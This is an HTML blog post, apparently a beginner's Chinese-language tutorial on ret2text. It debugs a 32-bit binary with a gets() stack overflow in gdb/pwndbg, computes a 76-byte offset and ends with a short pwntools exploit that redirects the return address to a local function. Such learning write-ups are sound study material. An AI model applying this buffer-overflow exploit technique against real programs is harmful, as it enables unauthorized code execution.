@@ -1,0 +1,332 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>初学者视角：我是如何一步步调试理解ret2text的 | Hakmaple&#39;s Blog</title>
+  <meta name="author" content="hakmaple">
+  
+  <meta name="description" content="0x01.基础指令详见：https://zz-zz-955.github.io/hugo-dev/p/gdb%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8pwndbg%E6%8F%92%E4%BB%B6/
+0x02.使用gdb调试ret2text$ file vulnvuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=321b931a0d7856bf5bba57b9ceb0c0fcc1ed737b, for GNU/Linux 3.2.0, not stripped
+
+看到是32位可执行文件，用IDA进行静态调试。
+在伪代码中查看vuln函数内容。
+int vuln()&amp;#123;  char s[68]; // [esp+0h] [ebp-48h] BYREF  puts(&amp;quot;There is something amazing here, do you know anything?&amp;quot;);  gets(s);  return printf(&amp;quot;Maybe I will tell you next time !&amp;quot;);&amp;#125;
+
+从中得知漏洞由gets函数触发，现在我们进gdb中进行调试。
+反汇编 vulnerable 函数，看看它的结构。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="初学者视角：我是如何一步步调试理解ret2text的"/>
+  <meta property="og:site_name" content="Hakmaple&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hakmaple&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/cat.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"><link href="https://cdn.bootcss.com/KaTeX/0.11.1/katex.min.css" rel="stylesheet" /></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hakmaple&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 初学者视角：我是如何一步步调试理解ret2text的</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="0x01-基础指令"><a href="#0x01-基础指令" class="headerlink" title="0x01.基础指令"></a>0x01.基础指令</h1><p>详见：<a target="_blank" rel="noopener" href="https://zz-zz-955.github.io/hugo-dev/p/gdb%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8pwndbg%E6%8F%92%E4%BB%B6/">https://zz-zz-955.github.io/hugo-dev/p/gdb%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E4%BD%BF%E7%94%A8pwndbg%E6%8F%92%E4%BB%B6/</a></p>
+<h1 id="0x02-使用gdb调试ret2text"><a href="#0x02-使用gdb调试ret2text" class="headerlink" title="0x02.使用gdb调试ret2text"></a>0x02.使用gdb调试ret2text</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file vuln</span><br><span class="line">vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=321b931a0d7856bf5bba57b9ceb0c0fcc1ed737b, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>看到是32位可执行文件，用IDA进行静态调试。</p>
+<p>在伪代码中查看<code>vuln</code>函数内容。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从中得知漏洞由<code>gets</code>函数触发，现在我们进<code>gdb</code>中进行调试。</p>
+<h3 id="反汇编-vulnerable-函数，看看它的结构。"><a href="#反汇编-vulnerable-函数，看看它的结构。" class="headerlink" title="反汇编 vulnerable 函数，看看它的结构。"></a>反汇编 vulnerable 函数，看看它的结构。</h3><p><img src="/./images/pwndbg-ret2sth/ret2text-disasm-vuln-func.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x0804920d &lt;+43&gt;:    call   0x8049060 &lt;gets@plt&gt; <span class="comment"># 漏洞点</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x08049209 &lt;+39&gt;:    lea    eax,[ebp-0x48] <span class="comment"># 这一段就是偏移量，0x48换成Dec就是72,之后加上</span></span><br></pre></td></tr></table></figure>
+
+<p>我们根据上述信息大致画出这样的一个图来表示栈空间情况</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|    调用者的栈帧...     |</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+ &lt;--- 调用前的 ESP</span><br><span class="line">|    返回地址 (EIP)      |  // 由 call vuln 压入 (目标!)</span><br><span class="line">+-----------------------+ &lt;--- 进入 vuln 后的 ESP</span><br><span class="line">|      保存的 EBP        |  // push ebp (vuln+0) ← 这里就是当前EBP指向的位置</span><br><span class="line">+-----------------------+ &lt;--- EBP 指向这里 (vuln+1)</span><br><span class="line">|      保存的 EBX        |  // push ebx (vuln+4)</span><br><span class="line">+-----------------------+</span><br><span class="line">|                       |</span><br><span class="line">|   分配的空间 (0x44)    |  // sub esp, 0x44</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+ &lt;--- 当前的 ESP</span><br><span class="line">|                       |</span><br><span class="line">|      buf[72字节]       |  // [ebp - 0x48]  ← 你的数据从这里开始写入</span><br><span class="line">|                       |</span><br><span class="line">+-----------------------+ &lt;--- EBP - 0x48</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动调试并设置关键断点"><a href="#启动调试并设置关键断点" class="headerlink" title="启动调试并设置关键断点"></a>启动调试并设置关键断点</h3><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在`vuln`入口处下断点</span></span><br><span class="line"><span class="keyword">b </span>vuln</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在`gets`调用前下断点</span></span><br><span class="line"><span class="keyword">b </span>*<span class="number">0x0804920d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在`gets`返回后下断点</span></span><br><span class="line"><span class="keyword">b </span>*<span class="number">0x08049212</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ret 指令前下断点</span></span><br><span class="line"><span class="keyword">b </span>*<span class="number">0x0804922c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行程序</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="观察进入函数时的栈帧（在-vuln-断点处）"><a href="#观察进入函数时的栈帧（在-vuln-断点处）" class="headerlink" title="观察进入函数时的栈帧（在 vuln 断点处）"></a>观察进入函数时的栈帧（在 vuln 断点处）</h3><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看寄存器</span></span><br><span class="line"><span class="attribute">i</span> r</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录关键地址</span></span><br><span class="line">p <span class="variable">$ebp</span></span><br><span class="line">p <span class="variable">$esp</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./images/pwndbg-ret2sth/ret2text-stack.png"></p>
+<p><img src="/./images/pwndbg-ret2sth/ret2text-stack-2.png"></p>
+<p>此时栈帧状态：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">|    返回地址 (EIP)      |  ← ESP指向这里</span><br><span class="line">+-----------------------+</span><br><span class="line">|      保存的 EBP        | </span><br><span class="line">+-----------------------+</span><br><span class="line">|      保存的 EBX        |</span><br><span class="line">+-----------------------+</span><br><span class="line">|         ...           |</span><br></pre></td></tr></table></figure>
+
+<h3 id="观察调用-gets-前的栈帧（在-call-gets-断点处）"><a href="#观察调用-gets-前的栈帧（在-call-gets-断点处）" class="headerlink" title="观察调用 gets 前的栈帧（在 call gets 断点处）"></a>观察调用 gets 前的栈帧（在 <code>call gets</code> 断点处）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 继续执行</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"># 再次查看栈帧</span><br><span class="line">stack 20</span><br><span class="line"></span><br><span class="line"># 查看 buf 的地址</span><br><span class="line">p $ebp - 0x48</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./images/pwndbg-ret2sth/ret2text-stack-3.png"></p>
+<p>从中我们看到：</p>
+<ul>
+<li>ESP 指向 gets 的参数（buf的地址）</li>
+<li>EBP 保持不变</li>
+<li>栈上已经分配了局部变量空间</li>
+</ul>
+<h3 id="单步执行并输入测试数据"><a href="#单步执行并输入测试数据" class="headerlink" title="单步执行并输入测试数据"></a>单步执行并输入测试数据</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; ni</span><br><span class="line">Breakpoint 3, 0x08049212 <span class="keyword">in</span> vuln ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────</span><br><span class="line"> EAX  0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line"> EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1</span><br><span class="line">*ECX  0xf7faa9c0 (_IO_stdfile_0_lock) ◂— 0</span><br><span class="line"> EDX  1</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line"> EBP  0xffffd048 ◂— <span class="string">&#x27;saaataaa&#x27;</span></span><br><span class="line"> ESP  0xffffcff0 —▸ 0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">*EIP  0x8049212 (vuln+48) ◂— add esp, 0x10</span><br><span class="line">───────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]───────────────────────────────────────────────────────</span><br><span class="line">   0x8049203 &lt;vuln+33&gt;    add    esp, 0x10</span><br><span class="line">   0x8049206 &lt;vuln+36&gt;    sub    esp, 0xc</span><br><span class="line">   0x8049209 &lt;vuln+39&gt;    lea    eax, [ebp - 0x48]</span><br><span class="line">   0x804920c &lt;vuln+42&gt;    push   eax</span><br><span class="line">b+ 0x804920d &lt;vuln+43&gt;    call   gets@plt                    &lt;gets@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► 0x8049212 &lt;vuln+48&gt;    add    esp, 0x10               ESP =&gt; 0xffffd000 (0xffffcff0 + 0x10)</span><br><span class="line">   0x8049215 &lt;vuln+51&gt;    sub    esp, 0xc                ESP =&gt; 0xffffcff4 (0xffffd000 - 0xc)</span><br><span class="line">   0x8049218 &lt;vuln+54&gt;    lea    eax, [ebx - 0x1fb0]     EAX =&gt; 0x804a050 ◂— <span class="string">&#x27;Maybe I will tell you next time !&#x27;</span></span><br><span class="line">   0x804921e &lt;vuln+60&gt;    push   eax</span><br><span class="line">   0x804921f &lt;vuln+61&gt;    call   <span class="built_in">printf</span>@plt                  &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">   0x8049224 &lt;vuln+66&gt;    add    esp, 0x10</span><br><span class="line">───────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffcff0 —▸ 0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">01:0004│-054 0xffffcff4 ◂— 0x20 /* <span class="string">&#x27; &#x27;</span> */</span><br><span class="line">02:0008│-050 0xffffcff8 ◂— 0</span><br><span class="line">03:000c│-04c 0xffffcffc —▸ 0x80491ee (vuln+12) ◂— add ebx, 0x2e12</span><br><span class="line">04:0010│ eax 0xffffd000 ◂— <span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">05:0014│-044 0xffffd004 ◂— <span class="string">&#x27;baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">06:0018│-040 0xffffd008 ◂— <span class="string">&#x27;caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">07:001c│-03c 0xffffd00c ◂— <span class="string">&#x27;daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaa&#x27;</span></span><br><span class="line">─────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0 0x8049212 vuln+48</span><br><span class="line">   1 0x61616174 None</span><br><span class="line">   2 0xffffd200 None</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x0804922c <span class="keyword">in</span> vuln ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────</span><br><span class="line">*EAX  0x21</span><br><span class="line">*EBX  0x61616172 (<span class="string">&#x27;raaa&#x27;</span>)</span><br><span class="line">*ECX  0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">*EDX  0</span><br><span class="line"> EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">*EBP  0x61616173 (<span class="string">&#x27;saaa&#x27;</span>)</span><br><span class="line">*ESP  0xffffd04c ◂— <span class="string">&#x27;taaa&#x27;</span></span><br><span class="line">*EIP  0x804922c (vuln+74) ◂— ret</span><br><span class="line">───────────────────────────────────────────────────────[ DISASM / i386 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]───────────────────────────────────────────────────────</span><br><span class="line"> ► 0x804922c &lt;vuln+74&gt;    ret                                &lt;0x61616174&gt;</span><br><span class="line">    ↓</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">───────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd04c ◂— <span class="string">&#x27;taaa&#x27;</span></span><br><span class="line">01:0004│     0xffffd050 —▸ 0xffffd200 ◂— 0x3e8</span><br><span class="line">02:0008│     0xffffd054 ◂— 0x70 /* <span class="string">&#x27;p&#x27;</span> */</span><br><span class="line">03:000c│     0xffffd058 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">04:0010│     0xffffd05c —▸ 0xf7da0519 (__libc_start_call_main+121) ◂— add esp, 0x10</span><br><span class="line">05:0014│     0xffffd060 ◂— 1</span><br><span class="line">06:0018│     0xffffd064 —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">07:001c│     0xffffd068 —▸ 0xffffd11c —▸ 0xffffd2c4 ◂— <span class="string">&#x27;HOSTTYPE=x86_64&#x27;</span></span><br><span class="line">─────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0 0x804922c vuln+74</span><br><span class="line">   1 0x61616174 None</span><br><span class="line">   2 0xffffd200 None</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; stack 30</span><br><span class="line">Warning: Avoided exploring possible address 0xffccab8b.</span><br><span class="line">You can explicitly explore it with `vmmap-explore 0xffcca000`</span><br><span class="line">00:0000│ esp 0xffffd04c ◂— <span class="string">&#x27;taaa&#x27;</span></span><br><span class="line">01:0004│     0xffffd050 —▸ 0xffffd200 ◂— 0x3e8</span><br><span class="line">02:0008│     0xffffd054 ◂— 0x70 /* <span class="string">&#x27;p&#x27;</span> */</span><br><span class="line">03:000c│     0xffffd058 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">04:0010│     0xffffd05c —▸ 0xf7da0519 (__libc_start_call_main+121) ◂— add esp, 0x10</span><br><span class="line">05:0014│     0xffffd060 ◂— 1</span><br><span class="line">06:0018│     0xffffd064 —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">07:001c│     0xffffd068 —▸ 0xffffd11c —▸ 0xffffd2c4 ◂— <span class="string">&#x27;HOSTTYPE=x86_64&#x27;</span></span><br><span class="line">08:0020│     0xffffd06c —▸ 0xffffd080 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">09:0024│     0xffffd070 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">0a:0028│     0xffffd074 —▸ 0x804922d (main) ◂— push ebp</span><br><span class="line">0b:002c│     0xffffd078 ◂— 1</span><br><span class="line">0c:0030│     0xffffd07c —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">0d:0034│     0xffffd080 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">0e:0038│     0xffffd084 —▸ 0xffffd114 —▸ 0xffffd285 ◂— <span class="string">&#x27;/home/zhailin/Binary-Security/Stack Overflow-x86/ret2text/vuln&#x27;</span></span><br><span class="line">0f:003c│     0xffffd088 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line">10:0040│     0xffffd08c —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">11:0044│     0xffffd090 ◂— 0x8067c5be</span><br><span class="line">12:0048│     0xffffd094 ◂— 0xcbceafae</span><br><span class="line">13:004c│     0xffffd098 ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">16:0058│     0xffffd0a4 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0</span><br><span class="line">17:005c│     0xffffd0a8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">18:0060│     0xffffd0ac ◂— 0x8b8b0700</span><br><span class="line">19:0064│     0xffffd0b0 —▸ 0xf7ffda40 ◂— 0</span><br><span class="line">1a:0068│     0xffffd0b4 —▸ 0xf7da04a6 (__libc_start_call_main+6) ◂— add ebx, 0x208b5a</span><br><span class="line">1b:006c│     0xffffd0b8 —▸ 0xf7fa9000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">1c:0070│     0xffffd0bc —▸ 0xf7da05f3 (__libc_start_main+147) —▸ 0xffccab8b ◂— 0xffccab8b</span><br><span class="line">1d:0074│     0xffffd0c0 ◂— 0</span><br></pre></td></tr></table></figure>
+
+<p>在<code>esp 0xffffd04c ◂— &#39;taaa&#39;</code>中得知返回地址已经被覆盖</p>
+<p>最后计算出偏移量是76<br><img src="/./images/pwndbg-ret2sth/ret2text-offset-pwndbg.png"></p>
+<h3 id="EXPLOIT"><a href="#EXPLOIT" class="headerlink" title="EXPLOIT"></a>EXPLOIT</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">pwn_addr = <span class="number">0x080491A6</span>  </span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">76</span> + p32(pwn_addr)  <span class="comment"># 68字节填充 + pwn()地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/08/28/crypto-basic-math-knowledge/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-09-20 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pwn/">Pwn<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Pwn/">Pwn<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 hakmaple's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
